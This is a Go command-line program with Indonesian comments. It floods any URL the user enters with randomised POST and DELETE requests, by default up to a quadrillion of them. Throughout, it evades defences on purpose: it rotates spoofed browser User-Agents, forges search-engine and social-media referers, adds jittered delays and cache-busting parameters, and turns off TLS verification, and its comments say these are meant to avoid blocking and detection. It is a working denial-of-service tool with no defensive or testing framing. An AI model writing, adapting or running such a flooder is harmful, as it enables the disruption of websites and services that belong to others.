package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	rand.Seed(time.Now().UnixNano())
	scanner := bufio.NewScanner(os.Stdin)

	// Input URL
	fmt.Print("Masukkan URL: ")
	scanner.Scan()
	urlInput := strings.TrimSpace(scanner.Text())

	// Tambahkan https:// jika tidak ada
	if !strings.HasPrefix(urlInput, "https://") && !strings.HasPrefix(urlInput, "https://") {
		urlInput = "https://" + urlInput
	}

	// Validasi URL
	parsedURL, err := url.Parse(urlInput)
	if err != nil {
		fmt.Printf("❌ URL tidak valid: %v\n", err)
		return
	}

	// Input jumlah request
	fmt.Print("Masukkan jumlah request/paket: ")
	scanner.Scan()
	jumlahRequestStr := strings.TrimSpace(scanner.Text())
	jumlahRequest, err := strconv.ParseInt(jumlahRequestStr, 10, 64)
	if err != nil || jumlahRequest <= 0 {
		jumlahRequest = 1000000000000000 // Default
	}
	fmt.Printf("Jumlah request: %d\n", jumlahRequest)

	// Konfigurasi untuk meningkatkan keberhasilan
	fmt.Print("Masukkan jumlah retry maksimal (default 3): ")
	scanner.Scan()
	maxRetriesStr := strings.TrimSpace(scanner.Text())
	maxRetries, _ := strconv.Atoi(maxRetriesStr)
	if maxRetries <= 0 {
		maxRetries = 3
	}

	fmt.Printf("\n🚀 Memulai pengiriman %d paket ke: %s\n", jumlahRequest, parsedURL.String())
	fmt.Printf("⚡ Konfigurasi: Max Retry=%d\n\n", maxRetries)

	// Membuat HTTP client dengan konfigurasi khusus untuk menghindari blocking
	client := &http.Client{
		Timeout: 30 * time.Second, // Timeout
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{
				Timeout:   30 * time.Second,
				KeepAlive: 30 * time.Second,
				DualStack: true,
			}).DialContext,
			MaxIdleConns:          500,
			MaxIdleConnsPerHost:   100,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
			DisableCompression:    false,
			ForceAttemptHTTP2:     true,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // HATI-HATI: Non-aktifkan verifikasi SSL
				MinVersion:         tls.VersionTLS12,
			},
		},
	}

	var wg sync.WaitGroup
	successCount := int64(0)
	failedCount := int64(0)
	var mu sync.Mutex

	// Channel untuk progress update
	progress := make(chan string, 1000)

	// Goroutine untuk menampilkan progress real-time
	go func() {
		for msg := range progress {
			fmt.Print(msg)
		}
	}()

	startTime := time.Now()

	// Worker pool pattern dengan jumlah worker optimal
	maxWorkers := 100 // Lebih sedikit untuk mengurangi tekanan
	requests := make(chan int64, maxWorkers*10)

	// List User-Agent untuk rotasi
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
	}

	// Referer untuk meniru traffic normal
	referers := []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://search.yahoo.com/",
		"https://www.facebook.com/",
		"https://twitter.com/",
	}

	// Start workers
	for w := 0; w < maxWorkers; w++ {
		go func(workerID int) {
			for requestID := range requests {
				wg.Add(1)
				go func(id int64) {
					defer wg.Done()
					
					// Random delay untuk menghindari pattern yang mudah dideteksi
					delay := time.Duration(rand.Intn(1000)) * time.Millisecond
					time.Sleep(delay)
					
					// Kirim request dengan retry mechanism
					sendRequestWithRetry(
						client, 
						parsedURL.String(), 
						id, 
						jumlahRequest, 
						&successCount, 
						&failedCount, 
						&mu, 
						progress, 
						maxRetries,
						userAgents,
						referers,
					)
				}(requestID)
			}
		}(w)
	}

	// Kirim semua request ID ke channel dengan rate limiting
	sentCount := int64(0)
	for i := int64(0); i < jumlahRequest; i++ {
		requests <- i
		sentCount++
		
		// Rate limiting yang lebih agresif
		if sentCount%100 == 0 {
			time.Sleep(500 * time.Millisecond) // Delay lebih lama
		}
		
		// Progress indicator
		if sentCount%1000 == 0 {
			progress <- fmt.Sprintf("📤 Mengirim paket ke-%d dari %d\n", sentCount, jumlahRequest)
		}
	}
	close(requests)

	// Tunggu semua request selesai
	wg.Wait()
	close(progress)

	// Beri waktu untuk menampilkan semua pesan
	time.Sleep(2 * time.Second)

	endTime := time.Now()
	duration := endTime.Sub(startTime)

	// Tampilkan ringkasan akhir
	fmt.Printf("\n" + strings.Repeat("=", 60) + "\n")
	fmt.Printf("📊 RINGKASAN AKHIR\n")
	fmt.Printf(strings.Repeat("=", 60) + "\n")
	fmt.Printf("🌐 URL Target    : %s\n", parsedURL.String())
	fmt.Printf("📦 Total Paket   : %d\n", jumlahRequest)
	fmt.Printf("✅ Berhasil      : %d (%.1f%%)\n", successCount, float64(successCount)/float64(jumlahRequest)*100)
	fmt.Printf("❌ Gagal         : %d (%.1f%%)\n", failedCount, float64(failedCount)/float64(jumlahRequest)*100)
	fmt.Printf("🔄 Max Retry     : %d\n", maxRetries)
	fmt.Printf("⏱️  Waktu         : %.2f detik\n", duration.Seconds())
	
	if duration.Seconds() > 0 {
		reqPerSec := float64(successCount) / duration.Seconds()
		fmt.Printf("🚀 Kecepatan     : %.2f request sukses/detik\n", reqPerSec)
	} else {
		fmt.Printf("🚀 Kecepatan     : Sangat cepat!\n")
	}
	
	successRate := float64(successCount) / float64(jumlahRequest) * 100
	fmt.Printf("📈 Tingkat Sukses: %.1f%%\n", successRate)
	
	fmt.Printf(strings.Repeat("=", 60) + "\n")
	
	if successRate >= 85.0 {
		fmt.Printf("🎉 TARGET 85%% BERHASIL TERCAPAI! (%.1f%%)\n", successRate)
	} else if successRate >= 50.0 {
		fmt.Printf("⚠️  Tingkat sukses %.1f%% - Coba tingkatkan max retry\n", successRate)
	} else {
		fmt.Printf("❌ Tingkat sukses rendah (%.1f%%). Server mungkin memblokir.\n", successRate)
	}
	
	fmt.Printf(strings.Repeat("=", 60) + "\n")
}

func sendRequestWithRetry(
	client *http.Client, 
	url string, 
	requestID int64, 
	totalRequests int64, 
	successCount, failedCount *int64, 
	mu *sync.Mutex, 
	progress chan<- string, 
	maxRetries int,
	userAgents []string,
	referers []string,
) {
	var lastError error
	
	for attempt := 1; attempt <= maxRetries; attempt++ {
		success := sendSingleRequest(
			client,
			url,
			requestID,
			totalRequests,
			successCount,
			failedCount,
			mu,
			progress,
			attempt,
			userAgents,
			referers,
			&lastError,
		)
		
		if success {
			return // Berhasil, keluar dari retry loop
		}
		
		// Jika bukan percobaan terakhir, tunggu sebelum retry
		if attempt < maxRetries {
			retryDelay := time.Duration(attempt*2) * time.Second
			select {
			case progress <- fmt.Sprintf("🔄 Paket %d/%d retry %d dalam %v\n", 
				requestID+1, totalRequests, attempt, retryDelay):
			default:
			}
			time.Sleep(retryDelay)
		}
	}
	
	// Semua retry gagal
	mu.Lock()
	*failedCount++
	mu.Unlock()
	
	select {
	case progress <- fmt.Sprintf("❌ Paket %d/%d GAGAL SETELAH %d RETRY: %v\n", 
		requestID+1, totalRequests, maxRetries, lastError):
	default:
	}
}

func sendSingleRequest(
	client *http.Client,
	url string,
	requestID int64,
	totalRequests int64,
	successCount, failedCount *int64,
	mu *sync.Mutex,
	progress chan<- string,
	attempt int,
	userAgents []string,
	referers []string,
	lastError *error,
) bool {
	
	// Buat context dengan timeout
	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
	defer cancel()
	
	// Pilih User-Agent dan Referer secara random
	userAgent := userAgents[rand.Intn(len(userAgents))]
	referer := referers[rand.Intn(len(referers))]
	
	// Tambahkan random query parameter untuk menghindari cache
	randomParam := fmt.Sprintf("?t=%d&r=%d", time.Now().UnixNano(), rand.Intn(10000))
	finalURL := url + randomParam
	
	// Pilih metode secara acak antara POST dan DELETE
	methods := []string{"POST", "DELETE"}
	method := methods[rand.Intn(len(methods))]
	
	// Membuat request dengan metode yang dipilih
	req, err := http.NewRequestWithContext(ctx, method, finalURL, nil)
	if err != nil {
		*lastError = err
		return false
	}
	
	// Set headers untuk meniru browser biasa
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Referer", referer)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Cache-Control", "max-age=0")
	
	// Untuk POST request, tambahkan beberapa data dummy
	if method == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		// Tambahkan body data dummy
		dummyData := strings.NewReader(fmt.Sprintf("data=%d&rand=%d", time.Now().UnixNano(), rand.Intn(10000)))
		req.Body = io.NopCloser(dummyData)
		req.ContentLength = int64(dummyData.Len())
	}
	
	// Tambahkan header DNT (Do Not Track) untuk tampak lebih legit
	if rand.Intn(2) == 0 {
		req.Header.Set("DNT", "1")
	}
	
	// Melakukan HTTP request
	resp, err := client.Do(req)
	if err != nil {
		*lastError = err
		return false
	}
	defer resp.Body.Close()
	
	// Baca response body (sebagian saja untuk efisiensi)
	bodyBuffer := make([]byte, 1024) // Hanya baca 1KB pertama
	n, err := io.ReadFull(resp.Body, bodyBuffer)
	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
		// Tidak fatal, lanjutkan
	}
	
	// Verifikasi response
	if resp.StatusCode >= 400 && resp.StatusCode != 404 {
		*lastError = fmt.Errorf("HTTP %d", resp.StatusCode)
		return false
	}
	
	// Request sukses
	mu.Lock()
	*successCount++
	mu.Unlock()
	
	// Tampilkan pesan sukses hanya untuk beberapa request pertama
	if (requestID+1) <= 10 || (requestID+1)%10000 == 0 {
		select {
		case progress <- fmt.Sprintf("✅ Paket %d/%d (attempt %d) sukses - Metode: %s, Status: %d, Size: %d bytes\n",
			requestID+1, totalRequests, attempt, method, resp.StatusCode, n):
		default:
		}
	}
	
	return true
}
